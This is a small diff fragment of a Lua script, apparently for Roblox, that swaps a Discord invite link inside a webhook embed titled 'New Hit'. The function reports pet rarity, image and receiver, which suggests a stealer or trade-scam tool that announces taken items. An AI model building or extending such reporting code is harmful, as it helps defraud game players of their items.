@@ -1025,7 +1025,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["avatar_url"] = imgs,
             ["embeds"] = { {
                 ["title"] = "**New Hit** ||With Rizz||",
-                ["url"] = "https://discord.gg/uSgzNwHDTS",
+                ["url"] = "https://discord.gg/wZqBNXS9Kn",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
